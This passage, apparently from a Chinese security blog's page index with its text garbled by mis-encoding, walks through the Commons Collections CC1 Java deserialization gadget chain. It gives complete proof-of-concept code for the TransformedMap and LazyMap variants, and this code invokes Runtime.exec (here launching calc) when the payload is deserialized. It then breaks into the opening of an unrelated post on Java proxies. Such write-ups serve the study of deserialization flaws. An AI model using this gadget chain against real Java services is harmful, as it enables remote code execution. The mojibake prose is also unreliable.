å½“ç„¶åˆ°è¿™é‡Œè¿˜æ˜¯æ²¡æœ‰ç»“æŸï¼Œæˆ‘ä»¬è¿˜è¦è€ƒè™‘ä¸¤ä¸ªé—®é¢˜ å¦‚ä½•é¡ºåˆ©è¿›å…¥ readObject é‡Œçš„åˆ¤æ–­æƒ³è¦æ‰§è¡Œ setValue ï¼Œè¿˜å¾—ç»•è¿‡ä¸¤ä¸ª ifï¼Œæˆ‘ä»¬å¯ä»¥ä¸‹æ–­ç‚¹è°ƒè¯•çœ‹çœ‹ã€‚ 1234567891011121314for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); if (memberType != null) &#123; // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) &#123; memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember( annotationType.members().get(name))); &#125; &#125;&#125; memberValue å°±æ˜¯æˆ‘ä»¬è®¾ç½®çš„ â€œkeyâ€ &#x3D;&gt; â€œvalueâ€ é”®å€¼å¯¹ï¼Œ ä½†æ˜¯ memberType ä¸º nullï¼Œç¬¬ä¸€å±‚ if åˆ¤æ–­éƒ½è¿›ä¸å»äº†ã€‚ memberType æ¥è‡ªäº memberTypes 1Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); è·å–æ³¨è§£ç±»å‹çš„æˆå‘˜åç§°åŠå…¶å¯¹åº”çš„ç±»å‹ã€‚è¿™ä¸ª Map çš„é”®æ˜¯æˆå‘˜çš„åç§°ï¼Œå€¼æ˜¯æˆå‘˜çš„ç±»å‹ è¿™é‡Œæ³¨è§£ç±»å‹æˆ‘ä»¬ä¼ çš„æ˜¯ Override 12public @interface Override &#123;&#125; å®ƒæ˜¯ç©ºçš„ï¼Œæ‰€ä»¥æ²¡æœ‰æˆå‘˜åç§°åŠå…¶å¯¹åº”çš„ç±»å‹ 12String name = memberValue.getKey();Class&lt;?&gt; memberType = memberTypes.get(name); memberValue.getKey() ä¼šæ‹¿åˆ°é”®å â€œkeyâ€,ç„¶å memberTypes.get(name) ï¼Œå°±ä¼šå» Override é‡Œé¢æ‰¾æœ‰æ²¡æœ‰ä¸€ä¸ªå« â€œkeyâ€ çš„æˆå‘˜ï¼Œå°±æ˜¯è¯´ memberTypes.get çš„å‚æ•°æ˜¯æˆ‘ä»¬ä¹‹å‰ map.put(&quot;key&quot;,&quot;value&quot;) çš„ â€œkeyâ€œ. æˆ‘ä»¬å¯ä»¥çœ‹çœ‹ Target æ³¨é‡Šã€‚ 123public @interface Target &#123; ElementType[] value();&#125; æˆ‘ä»¬å‘ç° Target æœ‰ä¸€ä¸ª value æˆå‘˜ï¼Œæ‰€ä»¥é”®åå–ä¸º valueï¼Œå°±èƒ½å¯¹åº”ä¸Šäº†. 1map.put(&quot;value&quot;, &quot;value&quot;); ç¬¬äºŒä¸ª if ç›´æ¥è¿›æ¥äº†ï¼Œå°±ä¸çœ‹äº†ã€‚ å½“ç„¶äº†ï¼Œç°åœ¨è¿˜æ˜¯ä¸èƒ½å‘½ä»¤æ‰§è¡Œï¼Œåˆæ˜¯ä»€ä¹ˆé—®é¢˜å‘¢ï¼Œæˆ‘ä»¬çœ‹çœ‹æˆ‘ä»¬ç°åœ¨å¾—åˆ°çš„ä»£ç  12345678910111213Transformer[] transformers = new Transformer[]&#123; new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);Map map = new HashMap();Map&lt;Object,Object&gt; transformMap = TransformedMap.decorate(map, null, chainedTransformer);map.put(&quot;value&quot;, &quot;value&quot;);Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);Object instance = constructor.newInstance(Target.class, transformMap); æˆ‘ä»¬éƒ½çŸ¥é“ 1234567Map map = new HashMap(); Map&lt;Object,Object&gt; transformMap = TransformedMap.decorate(map, null, chainedTransformer); map.put(&quot;value&quot;, &quot;value&quot;); Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object instance = constructor.newInstance(Target.class, transformMap); å®ç°çš„æ˜¯ååºåˆ—åŒ–æ—¶èµ°åˆ° chainedTransformer.transform æ—¶çš„å‚æ•°æ˜¯ Runtime.class 1chainedTransformer.transform(Runtime.class); ä¹Ÿå°±æ˜¯è¯´ AnnotationInvocationHandler é‡Œçš„ readObject çš„ memberValue.setValue çš„å‚æ•°å¾—æ˜¯ Runtime.classï¼Œä½†æ˜¯å¯æƒœçš„æ˜¯å¹¶ä¸æ˜¯è¿™æ · å¦‚ä½•è®¾ç½® chainedTransformer.transform çš„å‚æ•°ä¸ºæˆ‘ä»¬å¯æ§ConstantTransformer ç›´æ¥çœ‹æ„é€ å‡½æ•°å’Œ transform æ–¹æ³• 1234public ConstantTransformer(Object constantToReturn) &#123; super(); iConstant = constantToReturn;&#125; 123public Object transform(Object input) &#123; return iConstant;&#125; å·§ï¼Œå®åœ¨æ˜¯å¤ªå·§äº†ï¼Œç»™äººä¸€ç§è®¾è®¡å¥½çš„æ„Ÿè§‰ï¼Œè¿™ä¸ªæ„é€ å‡½æ•°æ­é… transform æ–¹æ³•å°±èƒ½å¤Ÿè¿”å›æˆ‘ä»¬ä¼ çš„ä»»æ„ç±»ã€‚ æ€ä¹ˆç†è§£å‘¢ï¼Ÿè™½ç„¶æˆ‘ä»¬æ§åˆ¶ä¸äº† setValueï¼Œå› ä¸ºå†™æ­»äº†ï¼Œé‚£æˆ‘ä»¬ç»§ç»­è·Ÿç€é“¾å­èµ°çœ‹ä¸€çœ‹ï¼ŒsetValue ä¹‹åå°±ä¼šè§¦å‘ checkSetValue ï¼Œè¿™ä¸ªæˆ‘ä»¬ä¹‹å‰å·²ç»æ¨åˆ°è¿‡äº†ï¼Œç„¶åå°±ä¼šæ‰§è¡Œ valueTransformer.transformï¼ŒvalueTransformer å°±æ˜¯æˆ‘ä»¬ä¼ çš„ chainedTransformerï¼Œå‚æ•°å°±æ˜¯ transformersã€‚okï¼Œå¯èƒ½è¿˜æ˜¯çœ‹ä¸å‡ºæ¥æˆ‘æƒ³è¡¨è¾¾ä»€ä¹ˆï¼Œæˆ‘ä»¬ç”»ä¸ªå›¾ è¿™æ˜¯ chainedTransformer çš„è°ƒç”¨å›¾ï¼Œä¸Šé¢çš„ç»“æœä½œä¸ºä¸‹é¢çš„è¾“å…¥ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªè¦ä¿è¯ä¼ ç»™ new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), çš„å‚æ•°æ˜¯ Runtime.class å°±è¡Œäº† è¿™ä¸ªæ—¶å€™ä¼ è¿›æ¥çš„ç¡®å®æˆ‘ä»¬ä¸Šé¢æˆªå›¾äº†çš„ **class.java.langâ€¦â€¦**ï¼Œ æœ‰ä»€ä¹ˆåŠæ³•å‘¢ï¼Œè¿™å°±è¯´åˆ° ConstantTransformer ç±»äº†ï¼Œæ—¢ç„¶å®ƒçš„ transform æ–¹æ³•èƒ½è¿”å›ä»»æ„ç±»ï¼Œè€Œ chainedTransformer é‡Œé¢åˆåœ¨å¾ªç¯è°ƒç”¨ transform ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥æŠŠ ConstantTransformer æ’å…¥ transforms é‡Œé¢ï¼Œç±»ä¼¼äºè¿™ç§æ•ˆæœ è™½ç„¶æœ€å¼€å§‹çš„å‚æ•°æ˜¯ class.java.langâ€¦â€¦ï¼Œä½†æ˜¯ ConstantTransformer.transform çš„è¿”å›å€¼ä¸æ˜¯ transform çš„å‚æ•°ï¼Œè€Œæ˜¯iConstantï¼Œä¹Ÿå°±æ˜¯æ„é€ å‡½æ•°çš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯ Runtime.class,è¿™æ ·å°±å®ç°äº†å®Œç¾ç»•è¿‡ã€‚ 0x03 å®Œæ•´ä»£ç  12345678910111213141516171819202122232425262728293031323334353637383940414243import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;import java.util.HashMap;import java.util.Map;public class Main &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); Map map = new HashMap(); Map&lt;Object,Object&gt; transformMap = TransformedMap.decorate(map, null, chainedTransformer); map.put(&quot;value&quot;, &quot;value&quot;); Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object instance = constructor.newInstance(Target.class, transformMap); serialize(instance); unserialize(); &#125; public static void serialize(Object obj) throws IOException &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;cc1.bin&quot;)); oos.writeObject(obj); &#125; public static void unserialize() throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;cc1.bin&quot;)); ois.readObject(); &#125;&#125; 0x04 æ‹“å±•ä¸Šé¢åˆ†æçš„çŸ¥è¯† CC1 é“¾çš„å…¶ä¸­ä¸€ç§ç‰ˆæœ¬ï¼Œè¿˜æœ‰ä¸€ç§ç‰ˆæœ¬ä¹Ÿå°±æ˜¯ ysoserial é‡Œç»™çš„å¦ä¸€ç§é“¾ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹å®˜æ–¹ç»™çš„é“¾å­ 1234567891011121314151617Gadget chain:\tObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() å¯ä»¥å‘ç°åé¢éƒ½ä¸€æ ·ï¼ŒåŒºåˆ«å°±åœ¨äº transformedMap.checkSetValue æ”¹æˆäº† LazyMap.get ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹ LazyMap çš„æ„é€ å’Œ get å‡½æ•° 123public static Map decorate(Map map, Transformer factory) &#123; return new LazyMap(map, factory);&#125; 123456789public Object get(Object key) &#123; // create value for key if key is not currently in the map if (map.containsKey(key) == false) &#123; Object value = factory.transform(key); map.put(key, value); return value; &#125; return map.get(key);&#125; æ‰€ä»¥æˆ‘ä»¬åªè¦è§¦å‘ factory.transform(key) å°±è¡Œäº†ï¼Œåˆ°æ—¶å€™ factory ä¼  ChainedTransformerï¼Œkey çš„è¯æ— æ‰€è°“ã€‚ é‚£ä¹ˆæ‰¾è°è°ƒç”¨äº† get æ–¹æ³•ï¼Œé“¾å­ç»™çš„æ˜¯ AnnotationInvocationHandler.invoke() 12345678910111213141516171819202122232425262728293031323334public Object invoke(Object proxy, Method method, Object[] args) &#123; String member = method.getName(); Class&lt;?&gt;[] paramTypes = method.getParameterTypes(); // Handle Object and Annotation methods if (member.equals(&quot;equals&quot;) &amp;&amp; paramTypes.length == 1 &amp;&amp; paramTypes[0] == Object.class) return equalsImpl(args[0]); if (paramTypes.length != 0) throw new AssertionError(&quot;Too many parameters for an annotation method&quot;); switch(member) &#123; case &quot;toString&quot;: return toStringImpl(); case &quot;hashCode&quot;: return hashCodeImpl(); case &quot;annotationType&quot;: return type; &#125; // Handle annotation member accessors Object result = memberValues.get(member); if (result == null) throw new IncompleteAnnotationException(type, member); if (result instanceof ExceptionProxy) throw ((ExceptionProxy) result).generateException(); if (result.getClass().isArray() &amp;&amp; Array.getLength(result) != 0) result = cloneArray(result); return result;&#125; å¯ä»¥çœ‹åˆ°ç¬¬ 22 è¡Œæœ‰ memberValues.get(member) ï¼ŒmemberValues æ˜¯å¯æ§çš„æˆ‘ä»¬å®ä¾‹åŒ–çš„æ—¶å€™ä¼  LazyMap å°±è¡Œäº† æ¥ä¸‹æ¥æ€è€ƒä¸¤ä¸ªé—®é¢˜ æ€ä¹ˆç»•è¿‡ä¸¤ä¸ª if ï¼Ÿ æ€ä¹ˆæ‰¾è°è°ƒç”¨äº† invoke paramTypes.length è¦ç­‰äº 0 æ‰è¡Œï¼Œä¹Ÿå°±æ˜¯ä¼ å…¥çš„æ–¹æ³•å¾—æ˜¯æ— å‚æ–¹æ³•ã€‚æˆ‘ä»¬å›çœ‹ sun.reflect.annotation.AnnotationInvocationHandler ï¼Œä¼šå‘ç°å®é™…ä¸Šè¿™ä¸ªç±»å®é™…å°±æ˜¯ä¸€ä¸ªåŠ¨æ€ä»£ç†ç±»è¦å®ç°çš„æ¥å£ï¼Œæ˜¯ä¸€ä¸ªInvocationHandlerï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡åŠ¨æ€ä»£ç†æ¥å®ç° invoke æ–¹æ³•çš„è°ƒç”¨ï¼Œæ—¢ç„¶æœ‰åŠ¨æ€ä»£ç†ç±»äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä»£ç†å¯¹è±¡æ‰¾è°å‘¢ï¼Ÿ å¦‚æœå°† AnnotationInvocationHandler å¯¹è±¡ç”¨ Proxy è¿›è¡ŒåŠ¨æ€ä»£ç†é‚£ä¹ˆåœ¨ readObject çš„æ—¶å€™ï¼Œåªè¦è°ƒç”¨ä»»æ„æ–¹æ³•ï¼Œå°±ä¼šè¿›å…¥åˆ° AnnotationInvocationHandler.invoke åˆ›å»ºä¸€ä¸ªåŠ¨æ€ä»£ç†å¯¹è±¡ proxyMapï¼Œä½¿ç”¨ handler ï¼ˆAnnotationInvocationHandlerï¼‰ä½œä¸ºè°ƒç”¨å¤„ç†å™¨ã€‚æ¯æ¬¡å¯¹ proxyMap çš„æ–¹æ³•è°ƒç”¨éƒ½ä¼šå§”æ‰˜ç»™ handler çš„ invoke æ–¹æ³•ï¼Œç„¶åä½¿ç”¨ proxyMap åˆ›å»ºäº†ä¸€ä¸ª AnnotationInvocationHandler å®ä¾‹ 1234567Map lazyMap = LazyMap.decorate(new HashMap(), chainedTransformer); Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap);Map proxyMap = (Map) Proxy.newProxyInstance(Main.class.getClassLoader(), new Class[]&#123;Map.class&#125;, handler);Object instance = constructor.newInstance(Target.class, proxyMap); æˆ‘ä»¬å‘ç° readObject è°ƒç”¨çš„ memberValues.entrySet() æ­£å¥½æ˜¯ä¸€ä¸ªæ— å‚æ–¹æ³•ï¼ˆproxyMap.entrySetï¼‰ï¼Œè¿›å…¥ invoke ååˆšå¥½è§£å†³äº†æˆ‘ä»¬ç¬¬ä¸€ä¸ªé—®é¢˜ &#x3D;&#x3D;&#x3D;&#x3D;&gt; ç»•è¿‡äº†ä¸¤ä¸ª ifï¼Œåˆä¸å¾—ä¸è®©äººæ€€ç–‘è¿™æ˜¯ä¸æ˜¯ä½œè€…ç•™çš„åé—¨ï¼Œå®åœ¨æ˜¯å¤ªå·§äº†ã€‚ å®Œæ•´ä»£ç  12345678910111213141516171819/* * LazyMap * */ Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); Map lazyMap = LazyMap.decorate(new HashMap(), chainedTransformer); Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap); Map proxyMap = (Map) Proxy.newProxyInstance(Main.class.getClassLoader(), new Class[]&#123;Map.class&#125;, handler); Object instance = constructor.newInstance(Target.class, proxyMap);// serialize(instance); unserialize(); ä¸‹é¢æ˜¯ä¸¤æ¡é“¾çš„æµç¨‹å›¾ æœ‰æ—¶å€™è°ƒè¯•ä¸Šè¿°POCçš„æ—¶å€™ï¼Œä¼šå‘ç°å¼¹å‡ºäº†ä¸¤ä¸ªè®¡ç®—å™¨ï¼Œæˆ–è€…æ²¡æœ‰æ‰§è¡Œåˆ°readObjectçš„æ—¶å€™å°±å¼¹å‡ºäº†è®¡ ç®—å™¨ï¼Œè¿™æ˜¾ç„¶ä¸æ˜¯é¢„æœŸçš„ç»“æœï¼ŒåŸå› æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ åœ¨ä½¿ç”¨Proxyä»£ç†äº†mapå¯¹è±¡åï¼Œæˆ‘ä»¬åœ¨ä»»ä½•åœ°æ–¹æ‰§è¡Œmapçš„æ–¹æ³•å°±ä¼šè§¦å‘Payloadå¼¹å‡ºè®¡ç®—å™¨ï¼Œæ‰€ ä»¥ï¼Œåœ¨æœ¬åœ°è°ƒè¯•ä»£ç çš„æ—¶å€™ï¼Œå› ä¸ºè°ƒè¯•å™¨ä¼šåœ¨ä¸‹é¢è°ƒç”¨ä¸€äº›toStringä¹‹ç±»çš„æ–¹æ³•ï¼Œå¯¼è‡´ä¸ç»æ„é—´è§¦å‘äº† å‘½ä»¤ã€‚ ysoserialå¯¹æ­¤æœ‰ä¸€äº›å¤„ç†ï¼Œå®ƒåœ¨POCçš„æœ€åæ‰å°†æ‰§è¡Œå‘½ä»¤çš„Transformeræ•°ç»„è®¾ç½®åˆ°transformerChain ä¸­ï¼ŒåŸå› æ˜¯é¿å…æœ¬åœ°ç”Ÿæˆåºåˆ—åŒ–æµçš„ç¨‹åºæ‰§è¡Œåˆ°å‘½ä»¤ã€‚ ä¸ºäº†è°ƒè¯•æ–¹ä¾¿æˆ‘ä»¬ä¹Ÿå¯ä»¥æŠŠ idea è°ƒè¯•çš„è‡ªåŠ¨ tostring å’Œå±•ç¤ºé›†åˆå¯¹è±¡é‚£ä¿©é€‰é¡¹å…³æ‰ 0x05 æ€è€ƒå†™äº†å¾ˆä¹…å…¶å®ä¹Ÿå¯ä»¥æ€»ç»“ä¸€ä¸‹äº†ï¼Œåœ¨æ‰¾ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­æˆ‘ä»¬ä¸æ–­åœ¨é—®ï¼Œâ€œè°â€è°ƒç”¨äº†â€œxxâ€æ–¹æ³•ï¼Œè¿™é‡Œçš„ xx æ–¹æ³•å°±æ˜¯è”ç³»ä¸¤ä¸ªç±»çš„çº½å¸¦ï¼Œè¿™é‡Œçš„â€œè°â€å°±æ˜¯æˆ‘ä»¬è¦ä»åå¾€å‰æ‰¾çš„ç±»ï¼Œæ¯æ¬¡æˆ‘ä»¬æ‰¾åˆ°äº†è¿™ä¸ªç±»ç¬¬ä¸€ä»¶äº‹å°±æ˜¯çœ‹è¿™ä¸ªç±»é‡Œçš„æ„é€ æ–¹æ³•ï¼Œæˆ–è€…è§¦å‘è¯¥æ„é€ æ–¹æ³•çš„å‡½æ•°ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªç±»èƒ½é‡å†™ readObjectï¼Œå½“ç„¶è¿™åªæ˜¯ä¸€ä¸ªå¤§è‡´çš„æ€è·¯ï¼Œä¸­é—´å¯èƒ½ä¼šç¢°åˆ°å„ç§å¤æ‚çš„æƒ…å†µï¼Œæˆ‘ä»¬éƒ½è¦ä¸€ä¸€ hack ä¸‹æ¥ã€‚ ä»£ç å®¡è®¡ï¼ˆå°¤å…¶æ˜¯ javaï¼‰çœŸçš„æ˜¯å¾ˆéš¾å¾ˆæ¯ç‡¥ï¼Œä½†æ˜¯åšæŒåˆ°æœ€åçœŸçš„å¾ˆé…·å¾ˆçˆ½ï¼Œè¿™æ˜¯æˆ‘å¤ç°çš„ç¬¬ä¸€æ¡ cc é“¾ï¼Œæ„Ÿè§¦é¢‡å¤šï¼Œæ²¡æœ‰ pç¥ çš„æ–‡æ¡£å’Œç™½ç»„é•¿çš„è§†é¢‘è¿˜æœ‰å‰è¾ˆä»¬çš„èµ„æ–™é æˆ‘è‡ªå·±æ ¹æœ¬éš¾ä»¥ç†è§£ä»¥åŠå¤ç°ï¼Œæœ€åä»¥ä¸€é¦–è¯—ä¸è¯¸å›å…±å‹‰å§ï¼Œå¸Œæœ›ä»£ç å®¡è®¡çš„è·¯ä¸Šæˆ‘ä»¬éƒ½èƒ½ä¸å¿˜åˆå¿ƒã€‚ å¿†ç§¦å¨¥Â·å¨„å±±å…³æ¯›æ³½ä¸œè¥¿é£çƒˆï¼Œé•¿ç©ºé›å«éœœæ™¨æœˆã€‚éœœæ™¨æœˆï¼Œé©¬è¹„å£°ç¢ï¼Œå–‡å­å£°å’½ã€‚é›„å…³æ¼«é“çœŸå¦‚é“ï¼Œè€Œä»Šè¿ˆæ­¥ä»å¤´è¶Šã€‚ä»å¤´è¶Šï¼Œè‹å±±å¦‚æµ·ï¼Œæ®‹é˜³å¦‚è¡€ã€‚å…«æœˆä¸€æ—¥","tags":["java å®‰å…¨"],"categories":["java å®‰å…¨","ååºåˆ—åŒ–"]},{"title":"Java ä»£ç†","path":"/2024/08/03/java/å¼€å‘/ä»£ç†/","content":"java é™æ€ä»£ç†ä¸åŠ¨æ€ä»£ç†å­¦ä¹  0x01 æ„ä¹‰åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œä»£ç†æ¨¡å¼æœ‰è®¸å¤šå®é™…çš„å¥½å¤„ï¼Œèƒ½å¤Ÿæå‡ç³»ç»Ÿçš„å¯ç»´æŠ¤æ€§ã€æ‰©å±•æ€§å’Œæ€§èƒ½ã€‚å½“ç„¶è¿™æ˜¯ GPT çš„å›ç­”ï¼Œå¯èƒ½æœ‰ç‚¹å®½æ³›ã€‚ä¸¾ä¸ªä¾‹å­å§ï¼Œå®¢æˆ·å¸Œæœ›ç§Ÿä¸€å¥—æˆ¿å­ï¼Œä½†ç”±äºæ²¡æœ‰æ—¶é—´å’Œç»éªŒï¼Œä¸æƒ³è‡ªå·±å»å¯»æ‰¾å’Œè”ç³»æˆ¿ä¸»ã€‚ä¸­ä»‹å…¬å¸æä¾›æœåŠ¡ï¼Œå¸®åŠ©å®¢æˆ·æ‰¾åˆ°ç¬¦åˆè¦æ±‚çš„æˆ¿å­ï¼Œå®‰æ’çœ‹æˆ¿ã€è°ˆåˆ¤ç§Ÿé‡‘ã€å¤„ç†ç§ŸèµåˆåŒç­‰äº‹åŠ¡ã€‚æˆ¿ä¸»é€šè¿‡ä¸­ä»‹å…¬å¸ç§Ÿå‡ºæˆ¿å­ï¼Œé¿å…äº†è‡ªå·±ç›´æ¥æ¥è§¦å¤§é‡å®¢æˆ·çš„éº»çƒ¦ã€‚ è¿™é‡Œè¯´çš„ä¸­ä»‹å°±ç›¸å½“äºæ˜¯ Java é‡Œçš„ä»£ç†ï¼ŒJavaä¸­çš„ä»£ç†æ¨¡å¼ç±»ä¼¼äºä¸Šé¢çš„ä»£ç†ï¼Œæˆ‘ä»¬ä¹Ÿæ˜¯ä¸ºä¸€ä¸ªç±»ï¼ˆå§”æ‰˜ç±»ï¼‰åˆ›å»ºä¸€ä¸ªä»£ç†ç±»ï¼Œæ¥ä»£è¡¨å®ƒæ¥å¯¹å¤–æä¾›åŠŸèƒ½ã€‚ 0x02 é™æ€ä»£ç†ä»£ç†ç±»åœ¨ç¼–è¯‘æ—¶å°±å·²ç»ç¡®å®šï¼Œä»£ç†ç±»å’Œç›®æ ‡ç±»éƒ½éœ€è¦å®ç°ä¸€è‡´çš„æ¥å£ã€‚ä»£ç†ç±»ç›´æ¥æŒæœ‰ç›®æ ‡ç±»çš„å¼•ç”¨ï¼Œé€šè¿‡æ¥å£è°ƒç”¨ç›®æ ‡ç±»çš„æ–¹æ³•ã€‚ ç°åœ¨æˆ‘ä»¬é€šè¿‡é™æ€ä»£ç†æ¥å®ç°ä¸Šé¢è¯´çš„æ‰¾æˆ¿çš„ä¾‹å­ï¼Œä¸­ä»‹ä»£ç†æˆ¿ä¸»ï¼Œæ‹¥æœ‰ç§Ÿæˆ¿ï¼Œç­¾åˆåŒçš„æƒé™ã€‚ å…ˆå®ç°åŒä¸€ä¸ªæ¥å£ï¼Œä»£ç†ç±»å’Œç›®æ ‡ç±»éƒ½éœ€è¦å®ç°åŒä¸€ä¸ªæ¥å£ã€‚åœ¨è¿™é‡Œä»£ç†ç±»å°±æ˜¯ä¸­ä»‹ï¼Œç›®æ ‡ç±»å°±æ˜¯æˆ¿ä¸»ã€‚ æˆ‘ä»¬å…ˆå®šä¹‰ä¸€ä¸ªç§Ÿæˆ¿æ¥å£ 123public interface RentService&#123; void rent(); &#125; ç„¶åè€ƒè™‘å®ç°æˆ¿ä¸»ç±»å’Œä¸­ä»‹ç±»ï¼Œè¿™é‡Œæˆ¿ä¸»åªè¦è€ƒè™‘ç§Ÿæˆ¿å°±è¡Œäº†ï¼Œè€Œä¸­ä»‹è¦è€ƒè™‘çš„äº‹å°±å¾ˆå¤šäº†ï¼ˆæ²Ÿæ§½çš„é¸£å¼ æˆ¿ä¸»ç±» 123456public static class HouseOwner implements RentService&#123; @Override public void rent() &#123; System.out.println(&quot;æˆ¿ä¸œå‡ºç§Ÿæˆ¿å­&quot;); &#125; &#125; ä¸­ä»‹ç±» 123456789101112public static class HouseProxy implements RentService&#123; private HouseOwner houseOwner; public HouseProxy(HouseOwner houseOwner)&#123; this.houseOwner = houseOwner; &#125; @Override public void rent() &#123; System.out.println(&quot;ä¸­ä»‹å¸®æˆ¿ä¸œå‡ºç§Ÿæˆ¿å­&quot;); houseOwner.rent(); System.out.println(&quot;ä¸­ä»‹ç­¾åˆåŒ&quot;); System.out.println(&quot;ä¸­ä»‹æ”¶å–ä¸­ä»‹è´¹&quot;); &#125; æµ‹è¯• 12345public static void main(String[] args) &#123; HouseOwner houseOwner = new HouseOwner(); HouseProxy houseProxy = new HouseProxy(houseOwner); houseProxy.rent();&#125; 0x03 åŠ¨æ€ä»£ç†ä¸ºä»€ä¹ˆæœ‰é™æ€ä»£ç†äº†è¿˜è¦ç”¨åŠ¨æ€ä»£ç†å‘¢ï¼ŸåŠ¨æ€ä»£ç†ç›¸æ¯”äºé™æ€ä»£ç†æœ‰ä»€ä¹ˆä¼˜åŠ¿å‘¢ï¼Ÿå½“åœºæ™¯ç¨å¾®å¤æ‚ä¸€äº›çš„æ—¶å€™ï¼Œé™æ€ä»£ç†çš„ç¼ºç‚¹ä¹Ÿä¼šæš´éœ²å‡ºæ¥ã€‚ å½“éœ€è¦ä»£ç†å¤šä¸ªç±»çš„æ—¶å€™ï¼Œç”±äºä»£ç†å¯¹è±¡è¦å®ç°ä¸ç›®æ ‡å¯¹è±¡ä¸€è‡´çš„æ¥å£ï¼Œæœ‰ä¸¤ç§æ–¹å¼ï¼š åªç»´æŠ¤ä¸€ä¸ªä»£ç†ç±»ï¼Œç”±è¿™ä¸ªä»£ç†ç±»å®ç°å¤šä¸ªæ¥å£ï¼Œä½†æ˜¯è¿™æ ·å°±å¯¼è‡´ä»£ç†ç±»è¿‡äºåºå¤§ æ–°å»ºå¤šä¸ªä»£ç†ç±»ï¼Œæ¯ä¸ªç›®æ ‡å¯¹è±¡å¯¹åº”ä¸€ä¸ªä»£ç†ç±»ï¼Œä½†æ˜¯è¿™æ ·ä¼šäº§ç”Ÿè¿‡å¤šçš„ä»£ç†ç±» å½“æ¥å£éœ€è¦å¢åŠ ã€åˆ é™¤ã€ä¿®æ”¹æ–¹æ³•çš„æ—¶å€™ï¼Œç›®æ ‡å¯¹è±¡ä¸ä»£ç†ç±»éƒ½è¦åŒæ—¶ä¿®æ”¹ï¼Œä¸æ˜“ç»´æŠ¤ã€‚ å®ç° é¦–å…ˆä»£ç†ç±»ä¸ç”¨å†ç»§æ‰¿ç›®æ 